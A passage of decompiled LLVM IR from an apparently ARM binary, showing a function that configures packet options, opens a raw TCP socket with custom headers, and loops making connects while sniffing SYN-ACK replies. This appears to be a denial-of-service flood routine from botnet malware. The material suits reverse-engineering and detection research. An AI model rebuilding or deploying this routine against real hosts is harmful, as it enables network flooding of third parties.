  uselistorder i32 %v3_bf38, { 2, 1, 0 }
  uselistorder i32 %v0_bf14, { 1, 0, 2 }
  uselistorder i32 %v1_bf04, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %v0_bf00, { 0, 3, 2, 1 }
  uselistorder i32 %v0_befc, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_bee8, { 1, 0 }
  uselistorder i1 %v7_bebc, { 1, 0 }
  uselistorder i32 %v3_beb8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v5_bea4, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_be70, { 1, 0, 2 }
  uselistorder i32 %v5_be50, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_bdf4, { 1, 0 }
  uselistorder i32 %v2_bd84, { 0, 3, 1, 2 }
  uselistorder i32 %v1_bd68, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i8 47, { 9, 8, 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_c450, { 1, 0 }
  uselistorder label %dec_label_pc_c43c, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c1cc.preheader, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread24, { 2, 1, 0 }
}

define i32 @function_c480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c480:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i8 @__decompiler_undefined_function_1()
  %tmp42 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c480 = load i32, i32* @r4, align 4
  %v1_c484 = urem i32 %arg1, 256
  store i32 %v1_c484, i32* @fp, align 4
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c49c = urem i32 %arg3, 256
  store i32 %v1_c49c, i32* @r4, align 4
  %v2_c4a0 = call i32 @_calloc(i32 %v1_c484, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_c4ac = load i32, i32* @fp, align 4
  store i32 %v0_c4ac, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @_calloc(i32 %v0_c4ac, i32 4)
  %v0_c4b4 = load i32, i32* @r5, align 4
  store i32 %v0_c4b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c4c4 = load i32, i32* @r4, align 4
  store i32 %v0_c4c4, i32* %r0.global-to-local, align 4
  %v5_c4c8 = inttoptr i32 %v0_c4b4 to i32*
  %v6_c4c8 = call i32 @function_b240(i32 %v0_c4c4, i32* %v5_c4c8, i32 2, i32 0)
  %v1_c4d4 = urem i32 %v6_c4c8, 256
  store i32 %v1_c4d4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c4e0 = load i32, i32* @r5, align 4
  store i32 %v0_c4e0, i32* %r1.global-to-local, align 4
  %v0_c4e4 = load i32, i32* @r4, align 4
  store i32 %v0_c4e4, i32* %r0.global-to-local, align 4
  %v6_c4ec = inttoptr i32 %v0_c4e0 to i32*
  %v7_c4ec = call i32 @function_b240(i32 %v0_c4e4, i32* %v6_c4ec, i32 3, i32 65535)
  %v0_c4f0 = load i32, i32* @r5, align 4
  store i32 %v0_c4f0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_c4ec, i32* @r6, align 4
  %v0_c500 = load i32, i32* @r4, align 4
  store i32 %v0_c500, i32* %r0.global-to-local, align 4
  %v4_c504 = inttoptr i32 %v0_c4f0 to i32*
  %v5_c504 = call i32 @function_b240(i32 %v0_c500, i32* %v4_c504, i32 4, i32 64)
  %v1_c50c = urem i32 %v5_c504, 256
  store i32 %v1_c50c, i32* %ip.global-to-local, align 4
  %v0_c510 = load i32, i32* @r5, align 4
  store i32 %v0_c510, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c51c = load i32, i32* @r4, align 4
  store i32 %v0_c51c, i32* %r0.global-to-local, align 4
  %v6_c524 = inttoptr i32 %v0_c510 to i32*
  %v7_c524 = call i32 @function_b240(i32 %v0_c51c, i32* %v6_c524, i32 5, i32 1)
  %v1_c530 = urem i32 %v7_c524, 256
  store i32 %v1_c530, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_c538 = load i32, i32* @r5, align 4
  store i32 %v0_c538, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c540 = load i32, i32* @r4, align 4
  store i32 %v0_c540, i32* %r0.global-to-local, align 4
  %v5_c548 = inttoptr i32 %v0_c538 to i32*
  %v6_c548 = call i32 @function_b240(i32 %v0_c540, i32* %v5_c548, i32 7, i32 65535)
  %v0_c54c = load i32, i32* @r5, align 4
  store i32 %v0_c54c, i32* %r1.global-to-local, align 4
  %v3_c550 = mul i32 %v6_c548, 65536
  store i32 %v3_c550, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c55c = load i32, i32* @r4, align 4
  store i32 %v0_c55c, i32* %r0.global-to-local, align 4
  %v4_c560 = inttoptr i32 %v0_c54c to i32*
  %v5_c560 = call i32 @function_b240(i32 %v0_c55c, i32* %v4_c560, i32 11, i32 0)
  %v1_c568 = urem i32 %v5_c560, 256
  store i32 %v1_c568, i32* %ip.global-to-local, align 4
  %v0_c56c = load i32, i32* @r5, align 4
  store i32 %v0_c56c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c578 = load i32, i32* @r4, align 4
  store i32 %v0_c578, i32* %r0.global-to-local, align 4
  %v5_c580 = inttoptr i32 %v0_c56c to i32*
  %v6_c580 = call i32 @function_b240(i32 %v0_c578, i32* %v5_c580, i32 12, i32 1)
  %v1_c588 = urem i32 %v6_c580, 256
  store i32 %v1_c588, i32* %ip.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  store i32 %v0_c58c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c598 = load i32, i32* @r4, align 4
  store i32 %v0_c598, i32* %r0.global-to-local, align 4
  %v5_c5a0 = inttoptr i32 %v0_c58c to i32*
  %v6_c5a0 = call i32 @function_b240(i32 %v0_c598, i32* %v5_c5a0, i32 13, i32 1)
  %v1_c5a8 = urem i32 %v6_c5a0, 256
  store i32 %v1_c5a8, i32* %ip.global-to-local, align 4
  %v0_c5ac = load i32, i32* @r5, align 4
  store i32 %v0_c5ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5b8 = load i32, i32* @r4, align 4
  store i32 %v0_c5b8, i32* %r0.global-to-local, align 4
  %v5_c5c0 = inttoptr i32 %v0_c5ac to i32*
  %v6_c5c0 = call i32 @function_b240(i32 %v0_c5b8, i32* %v5_c5c0, i32 14, i32 0)
  %v1_c5c8 = urem i32 %v6_c5c0, 256
  store i32 %v1_c5c8, i32* %ip.global-to-local, align 4
  %v0_c5cc = load i32, i32* @r5, align 4
  store i32 %v0_c5cc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5d8 = load i32, i32* @r4, align 4
  store i32 %v0_c5d8, i32* %r0.global-to-local, align 4
  %v5_c5e0 = inttoptr i32 %v0_c5cc to i32*
  %v6_c5e0 = call i32 @function_b240(i32 %v0_c5d8, i32* %v5_c5e0, i32 15, i32 0)
  %v1_c5e8 = urem i32 %v6_c5e0, 256
  store i32 %v1_c5e8, i32* %ip.global-to-local, align 4
  %v0_c5ec = load i32, i32* @r5, align 4
  store i32 %v0_c5ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5f8 = load i32, i32* @r4, align 4
  store i32 %v0_c5f8, i32* %r0.global-to-local, align 4
  %v5_c600 = inttoptr i32 %v0_c5ec to i32*
  %v6_c600 = call i32 @function_b240(i32 %v0_c5f8, i32* %v5_c600, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_c600, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_c610 = load i32, i32* @r5, align 4
  store i32 %v0_c610, i32* %r1.global-to-local, align 4
  %v0_c614 = load i32, i32* @r4, align 4
  store i32 %v0_c614, i32* %r0.global-to-local, align 4
  %v1_c618 = urem i32 %v6_c600, 256
  store i32 %v1_c618, i32* @r8, align 4
  %v4_c61c = inttoptr i32 %v0_c610 to i32*
  %v5_c61c = call i32 @function_b240(i32 %v0_c614, i32* %v4_c61c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c628 = load i32, i32* @r5, align 4
  store i32 %v0_c628, i32* %r1.global-to-local, align 4
  store i32 %v5_c61c, i32* @sb, align 4
  %v0_c630 = load i32, i32* @r4, align 4
  store i32 %v0_c630, i32* %r0.global-to-local, align 4
  %v4_c634 = inttoptr i32 %v0_c628 to i32*
  %v5_c634 = call i32 @function_b240(i32 %v0_c630, i32* %v4_c634, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_c640 = urem i32 %v5_c634, 256
  store i32 %v1_c640, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c650 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v0_c654 = load i32, i32* @r7, align 4
  %v3_c654 = udiv i32 %v0_c654, 65536
  store i32 %v3_c654, i32* %r1.global-to-local, align 4
  %v7_c658 = icmp eq i32 %v3_c650, -1
  store i1 %v7_c658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c658, label %dec_label_pc_c8dc, label %dec_label_pc_c668

dec_label_pc_c668:                                ; preds = %dec_label_pc_c480
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c670 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c670, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c684 = call i32 @_setsockopt()
  store i32 %v0_c684, i32* %r0.global-to-local, align 4
  %v7_c688 = icmp eq i32 %v0_c684, -1
  store i1 %v7_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c688, label %dec_label_pc_c8d4, label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %dec_label_pc_c668
  %v0_c690 = load i32, i32* @fp, align 4
  %v2_c690 = icmp eq i32 %v0_c690, 0
  store i1 %v2_c690, i1* %cpsr_z.global-to-local, align 1
  %v0_c694 = load i32, i32* @r6, align 4
  %v3_c694 = mul i32 %v0_c694, 65536
  store i32 %v3_c694, i32* %r0.global-to-local, align 4
  %v3_c698 = urem i32 %v0_c694, 65536
  store i32 %v3_c698, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp85 = icmp slt i32 %v0_c690, 1
  br i1 %tmp85, label %.thread27, label %dec_label_pc_c6bc.preheader

.thread27:                                        ; preds = %dec_label_pc_c690
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_cb5c

dec_label_pc_c6bc.preheader:                      ; preds = %dec_label_pc_c690
  %v5_c6a0 = load i32, i32* @r7, align 4
  %v8_c6a0 = udiv i32 %v5_c6a0, 16777216
  %tmp86 = udiv i32 %v0_c694, 256
  %v8_c6a4 = urem i32 %tmp86, 256
  store i32 %v8_c6a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_c6c8 = urem i32 %v0_c694, 256
  %v3_c7b4 = icmp ugt i32 %v0_c654, -65537
  %v2_c7d8 = ptrtoint i32* %stack_var_-60 to i32
  %v4_c7f4 = mul nuw nsw i32 %v1_c6c8, 256
  %v5_c7f4 = or i32 %v8_c6a4, %v4_c7f4
  %sext11 = mul i32 %tmp86, 16777216
  %v4_c800 = sdiv i32 %sext11, 16777216
  %v3_c808 = ashr i32 %sext11, 31
  %v2_c82c = ptrtoint i32* %stack_var_-76 to i32
  %v2_c838 = ptrtoint i32* %stack_var_-332 to i32
  %v2_c83c = ptrtoint i32* %stack_var_-44 to i32
  %v4_c884 = zext i8 %tmp41 to i32
  %v4_c888 = zext i8 %tmp40 to i32
  %v4_c894 = mul nuw nsw i32 %v4_c888, 256
  %v4_c8a4 = zext i8 %tmp to i32
  %v1_c8a8 = and i32 %v4_c8a4, 18
  %v2_c8ac = icmp eq i32 %v1_c8a8, 18
  %v1_c7c4 = mul nuw nsw i32 %v3_c654, 256
  %v4_c7c8 = and i32 %v1_c7c4, 65280
  %v5_c7c8 = or i32 %v8_c6a0, %v4_c7c8
  %v3_c7cc108 = udiv i32 %v4_c7c8, 256
  %v1_c7d0 = trunc i32 %v3_c7cc108 to i8
  %sext = mul i32 %v6_c4c8, 16777216
  %v4_c9d0 = sdiv i32 %sext, 16777216
  %sext9 = mul i32 %v5_c504, 16777216
  %v4_c9e4 = sdiv i32 %sext9, 16777216
  %v5_c894 = or i32 %v4_c884, %v4_c894
  %v1_c8b4 = and i32 %v4_c8a4, 5
  %v2_c8b4 = icmp eq i32 %v1_c8b4, 0
  %v1_c7d4 = trunc i32 %v8_c6a0 to i8
  %v1_c9e0 = trunc i32 %v4_c9d0 to i8
  %v1_caac = urem i32 %v5_c560, 2
  %tmp109 = sub nsw i32 0, %v1_caac
  %v4_cab4 = and i32 %tmp109, 32
  %v1_cac4 = urem i32 %v6_c580, 2
  %tmp110 = sub nsw i32 0, %v1_cac4
  %v4_cacc = and i32 %tmp110, 16
  %v1_cadc = urem i32 %v6_c5a0, 2
  %tmp111 = sub nsw i32 0, %v1_cadc
  %v4_cae4 = and i32 %tmp111, 8
  %v1_caf4 = urem i32 %v6_c5c0, 2
  %tmp112 = sub nsw i32 0, %v1_caf4
  %v4_cafc = and i32 %tmp112, 4
  %v1_cb0c = urem i32 %v6_c5e0, 2
  %tmp113 = sub nsw i32 0, %v1_cb0c
  %v3_cb14 = and i32 %tmp113, 2
  br label %dec_label_pc_c6bc

dec_label_pc_c6bc:                                ; preds = %dec_label_pc_cb48, %dec_label_pc_c8bc, %dec_label_pc_c6bc.preheader
  store i32 %v8_c6a4, i32* %r3.global-to-local, align 4
  store i32 %v1_c6c8, i32* %ip.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @sb, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 40
  store i32 %v1_c6d4, i32* @sl, align 4
  br label %dec_label_pc_c6d8

dec_label_pc_c6d8:                                ; preds = %dec_label_pc_c8c8, %dec_label_pc_c6bc
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c6e4 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_c6e4, i32* %r0.global-to-local, align 4
  %v7_c6e8 = icmp eq i32 %v3_c6e4, -1
  store i1 %v7_c6e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c6e4, i32* @r7, align 4
  br i1 %v7_c6e8, label %dec_label_pc_cb48, label %dec_label_pc_c6f4

dec_label_pc_c6f4:                                ; preds = %dec_label_pc_c6d8
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c6fc = call i32 (i32, i32, ...) @fcntl(i32 %v3_c6e4, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_c704 = or i32 %v2_c6fc, 2048
  store i32 %v1_c704, i32* %r2.global-to-local, align 4
  %v0_c708 = load i32, i32* @r7, align 4
  store i32 %v0_c708, i32* %r0.global-to-local, align 4
  %v2_c70c = call i32 (i32, i32, ...) @fcntl(i32 %v0_c708, i32 4)
  %v3_c710 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c710, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_c72c = mul i32 %v3_c710, 24
  store i32 %v5_c72c, i32* %r1.global-to-local, align 4
  %v2_c730 = add i32 %v5_c72c, %arg2
  store i32 %v2_c730, i32* %r2.global-to-local, align 4
  %v1_c734 = add i32 %v2_c730, 20
  %v2_c734 = inttoptr i32 %v1_c734 to i8*
  %v3_c734 = load i8, i8* %v2_c734, align 1
  %v4_c734 = zext i8 %v3_c734 to i32
  store i32 %v4_c734, i32* %r3.global-to-local, align 4
  %v2_c738 = icmp ugt i8 %v3_c734, 30
  %v7_c738 = icmp eq i8 %v3_c734, 31
  store i1 %v7_c738, i1* %cpsr_z.global-to-local, align 1
  %v2_c73c = xor i1 %v7_c738, true
  %v3_c73c = and i1 %v2_c738, %v2_c73c
  %v5_c73c = add i32 %v2_c730, 16
  %v6_c73c = inttoptr i32 %v5_c73c to i32*
  %v7_c73c = load i32, i32* %v6_c73c, align 4
  br i1 %v3_c73c, label %dec_label_pc_c7a8, label %dec_label_pc_c748

dec_label_pc_c748:                                ; preds = %dec_label_pc_c6f4
  store i32 %v7_c73c, i32* %r4.global-to-local, align 4
  %v0_c74c = call i32 @function_10bd8()
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  %v3_c750 = load i32, i32* %stack_var_-40, align 4
  %v5_c758 = mul i32 %v3_c750, 24
  %v2_c764 = add i32 %v5_c758, %arg2
  store i32 %v2_c764, i32* %r1.global-to-local, align 4
  %v1_c760 = udiv i32 %v7_c73c, 256
  %v3_c768 = and i32 %v1_c760, 65280
  store i32 %v3_c768, i32* %r2.global-to-local, align 4
  %v1_c76c = and i32 %v7_c73c, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_c76c, i32* %r3.global-to-local, align 4
  %v3_c770 = mul i32 %v7_c73c, 16777216
  store i32 %v3_c770, i32* %ip.global-to-local, align 4
  %v1_c774 = add i32 %v2_c764, 20
  %v2_c774 = inttoptr i32 %v1_c774 to i8*
  %v3_c774 = load i8, i8* %v2_c774, align 1
  %v4_c774 = zext i8 %v3_c774 to i32
  store i32 %v4_c774, i32* %lr.global-to-local, align 4
  %v4_c778 = mul i32 %v1_c76c, 256
  %v5_c778 = or i32 %v4_c778, %v3_c770
  store i32 %v5_c778, i32* %ip.global-to-local, align 4
  %v4_c77c = udiv i32 %v7_c73c, 16777216
  %v5_c77c = or i32 %v3_c768, %v4_c77c
  %v2_c780 = or i32 %v5_c77c, %v5_c778
  %v7_c784 = lshr i32 %v0_c74c, %v4_c774
  %v8_c784 = add i32 %v7_c784, %v2_c780
  store i32 %v8_c784, i32* %r2.global-to-local, align 4
  %v3_c790 = mul i32 %v8_c784, 16777216
  %v1_c794 = and i32 %v8_c784, 65280
  store i32 %v1_c794, i32* %r0.global-to-local, align 4
  %v4_c798 = mul nuw nsw i32 %v1_c794, 256
  %v5_c798 = or i32 %v4_c798, %v3_c790
  store i32 %v5_c798, i32* %r1.global-to-local, align 4
  %v2_c7a0 = call i32 @llvm.bswap.i32(i32 %v8_c784)
  br label %dec_label_pc_c7a8

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c6f4, %dec_label_pc_c748
  %storemerge35 = phi i32 [ %v2_c7a0, %dec_label_pc_c748 ], [ %v7_c73c, %dec_label_pc_c6f4 ]
  store i32 %v3_c654, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_c7b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7b4, label %dec_label_pc_c8e4, label %dec_label_pc_c7bc

dec_label_pc_c7bc:                                ; preds = %dec_label_pc_c7a8
  store i32 %v3_c654, i32* %r0.global-to-local, align 4
  store i32 %v8_c6a0, i32* %r1.global-to-local, align 4
  store i32 %v5_c7c8, i32* %r3.global-to-local, align 4
  store i32 %v3_c7cc108, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c7d8

dec_label_pc_c7d8:                                ; preds = %dec_label_pc_c8e4, %dec_label_pc_c7bc
  %stack_var_-57.0 = phi i8 [ %v1_c8ec, %dec_label_pc_c8e4 ], [ %v1_c7d0, %dec_label_pc_c7bc ]
  %storemerge = phi i8 [ %v1_c8e4, %dec_label_pc_c8e4 ], [ %v1_c7d4, %dec_label_pc_c7bc ]
  store i32 %v2_c7d8, i32* @r1, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_c7e0 = load i32, i32* @r7, align 4
  store i32 %v0_c7e0, i32* @r0, align 4
  %v3_c7e4 = call i32 @_connect(i32 %v0_c7e0, i32 %v2_c7d8, i32 16)
  store i32 %v1_c6c8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_c7f4, i32* %r2.global-to-local, align 4
  %v2_c7fc = call i32 @time(i32* null)
  store i32 %v2_c7fc, i32* %r0.global-to-local, align 4
  store i32 %v2_c7fc, i32* %r4.global-to-local, align 4
  store i32 %v3_c808, i32* %ip.global-to-local, align 4
  %v9_c868 = icmp eq i32 %tmp42, %storemerge35
  %v4_c88c = zext i8 %storemerge to i32
  %v4_c890 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_c868 to i32
  %v9_c87c = icmp eq i1 %v9_c868, false
  %v4_c898 = mul nuw nsw i32 %v4_c890, 256
  %v5_c898 = or i32 %v4_c898, %v4_c88c
  %v9_c89c = icmp eq i32 %v5_c898, %v5_c894
  br label %dec_label_pc_c824

dec_label_pc_c814:                                ; preds = %.thread33, %dec_label_pc_c884, %dec_label_pc_c8b4, %bb89
  %v2_c814 = call i32 @time(i32* null)
  %v0_c818 = load i32, i32* %r4.global-to-local, align 4
  %v2_c818 = sub i32 %v2_c814, %v0_c818
  store i32 %v2_c818, i32* %r0.global-to-local, align 4
  %v7_c81c = icmp eq i32 %v2_c818, 10
  store i1 %v7_c81c, i1* %cpsr_z.global-to-local, align 1
  %v8_c820 = icmp sgt i32 %v2_c818, 10
  br i1 %v8_c820, label %dec_label_pc_c8c8, label %dec_label_pc_c824

dec_label_pc_c824:                                ; preds = %dec_label_pc_c814, %dec_label_pc_c7d8
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* @r2, align 4
  store i32 %v2_c838, i32* @r1, align 4
  store i32 %v2_c83c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c650, i32* @r0, align 4
  %v7_c84c = call i32 @_recvfrom(i32 %v3_c650, i32 %v2_c838, i32 256, i32 16384, i32 %v2_c82c, i32 %v2_c83c)
  store i32 %v7_c84c, i32* %r2.global-to-local, align 4
  %v7_c854 = icmp eq i32 %v7_c84c, -1
  store i1 %v7_c854, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_c854, label %dec_label_pc_c8dc, label %dec_label_pc_c860

dec_label_pc_c860:                                ; preds = %dec_label_pc_c824
  store i32 %storemerge35, i32* %lr.global-to-local, align 4
  store i32 %tmp42, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_c874 = icmp eq i32 %v7_c84c, 40
  store i1 %v7_c874, i1* %cpsr_z.global-to-local, align 1
  %tmp114 = icmp ult i32 %v7_c84c, 41
  br i1 %tmp114, label %.thread33, label %bb89

.thread33:                                        ; preds = %dec_label_pc_c860
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c814

bb89:                                             ; preds = %dec_label_pc_c860
  store i1 %v9_c87c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c87c, label %dec_label_pc_c814, label %dec_label_pc_c884

dec_label_pc_c884:                                ; preds = %bb89
  store i32 %v4_c888, i32* %r1.global-to-local, align 4
  store i32 %v4_c88c, i32* %ip.global-to-local, align 4
  store i32 %v4_c890, i32* %r2.global-to-local, align 4
  store i32 %v5_c894, i32* %r3.global-to-local, align 4
  store i32 %v5_c898, i32* @r5, align 4
  store i1 %v9_c89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c89c, label %dec_label_pc_c8a4, label %dec_label_pc_c814

dec_label_pc_c8a4:                                ; preds = %dec_label_pc_c884
  store i32 %v4_c8a4, i32* %r2.global-to-local, align 4
  store i32 %v1_c8a8, i32* %r3.global-to-local, align 4
  store i1 %v2_c8ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c8ac, label %dec_label_pc_c8f8, label %dec_label_pc_c8b4

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c8a4
  store i1 %v2_c8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c8b4, label %dec_label_pc_c814, label %dec_label_pc_c8bc

dec_label_pc_c8bc:                                ; preds = %dec_label_pc_c8b4
  %v0_c8bc = load i32, i32* @r7, align 4
  store i32 %v0_c8bc, i32* %r0.global-to-local, align 4
  %v1_c8c0 = call i32 @close(i32 %v0_c8bc)
  store i32 %v1_c8c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6bc

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c814
  %v0_c8c8 = load i32, i32* @r7, align 4
  store i32 %v0_c8c8, i32* %r0.global-to-local, align 4
  %v1_c8cc = call i32 @close(i32 %v0_c8c8)
  store i32 %v1_c8cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c6d8

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c668
  store i32 %v3_c650, i32* %r0.global-to-local, align 4
  %v1_c8d8 = call i32 @close(i32 %v3_c650)
  store i32 %v1_c8d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c8dc

dec_label_pc_c8dc:                                ; preds = %dec_label_pc_c824, %dec_label_pc_c480, %dec_label_pc_c8d4
  %v29_c8e0 = phi i32 [ %v3_c650, %dec_label_pc_c480 ], [ %v1_c8d8, %dec_label_pc_c8d4 ], [ 0, %dec_label_pc_c824 ]
  store i32 %v3_c480, i32* %r4.global-to-local, align 4
  ret i32 %v29_c8e0

